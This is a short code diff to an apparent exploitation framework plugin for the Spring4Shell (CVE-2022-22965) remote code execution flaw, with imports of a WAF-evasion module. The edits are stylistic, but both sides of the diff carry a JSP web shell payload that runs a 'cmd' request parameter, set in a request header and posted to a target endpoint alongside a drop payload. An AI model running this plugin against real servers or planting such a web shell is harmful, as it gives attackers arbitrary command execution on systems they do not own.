@@ -5,13 +5,15 @@ Plugin for CVE-2022-22965: Spring4Shell ClassLoader RCE.
 from __future__ import annotations
 
 import urllib.parse
-from typing import Any
-import requests
+from typing import TYPE_CHECKING, Any
 
 from spring2shell.core.reporter import build_finding
 from spring2shell.evasion.waf_engine import waf_engine
 from spring2shell.plugins.base import BasePlugin
 from spring2shell.utils.auth import audit_log, rate_limit_acquire
+
+if TYPE_CHECKING:
+    import requests
 
 
 class CVE_2022_22965_Plugin(BasePlugin):
@@ -79,7 +81,7 @@ class CVE_2022_22965_Plugin(BasePlugin):
         drop_payload = self.payload_templates[0]
         req_headers = headers.copy()
         req_headers["Content-Type"] = "application/x-www-form-urlencoded"
-        req_headers["c2"] = f"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+        req_headers["c2"] = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
 
         try:
             session.post(endpoint, data=drop_payload, headers=req_headers, timeout=5)
